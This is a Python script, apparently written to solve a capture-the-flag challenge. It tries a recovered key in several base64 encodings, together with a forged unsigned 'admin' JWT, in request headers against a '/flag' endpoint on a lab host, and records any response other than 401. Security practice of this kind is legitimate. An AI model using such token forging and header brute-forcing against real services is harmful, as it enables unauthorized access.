#!/usr/bin/env python3
import base64, json, time, requests, itertools

def b64_std(s, pad=True):
    v = base64.b64encode(s.encode()).decode()
    return v if pad else v.rstrip("=")

def b64url(data_str, pad=True):
    v = base64.urlsafe_b64encode(data_str.encode()).decode()
    return v if pad else v.rstrip("=")

def jwt_b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

KEY = "C%{6bSUAs52sI@$K8Ouk0"
KEY_PWD = "pwd:" + KEY

header_b64 = jwt_b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_b64 = jwt_b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
real_jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

values = {
    "plain (no prefix)": KEY,
    "plain (pwd: prefix)": KEY_PWD,
    "b64-std padded (no prefix)": b64_std(KEY, True),
    "b64-std padded (pwd: prefix)": b64_std(KEY_PWD, True),
    "b64-std stripped (no prefix)": b64_std(KEY, False),
    "b64-std stripped (pwd: prefix)": b64_std(KEY_PWD, False),
    "b64-urlsafe padded (no prefix)": b64url(KEY, True),
    "b64-urlsafe padded (pwd: prefix)": b64url(KEY_PWD, True),
}

TARGET = "magic-key.hkn"
hits = []

for label, val in values.items():
    header_combos = [
        {"Session-Token": val},
        {"Session-Token": val, "URL-Maybe": "/flag"},
        {"Session-Token": val, "URL": "/flag"},
        {"Session-Token": val, "JWT": real_jwt},
        {"Session-Token": val, "JWT": real_jwt, "URL-Maybe": "/flag"},
    ]
    for headers in header_combos:
        for path in ("/flag", "/next_chars"):
            params = {"char": "s"} if path == "/next_chars" else None
            try:
                r = requests.get(f"http://{TARGET}{path}", params=params, headers=headers, timeout=4)
            except requests.exceptions.RequestException as e:
                print(f"ERROR {label} {headers.keys()} {path}: {e}")
                continue
            if r.status_code != 401:
                hits.append((label, list(headers.keys()), path, r.status_code, r.text.strip()[:300]))
                print(f"!!! NON-401: {label} | headers={list(headers.keys())} | {path} -> {r.status_code}: {r.text.strip()[:300]}")

print(f"\nDone. {len(hits)} non-401 responses found out of {len(values)*5*2} combinations tested.")
if not hits:
    print("Everything was 401 -- the reconstructed string alone (in any encoding/header combo) is not the answer.")
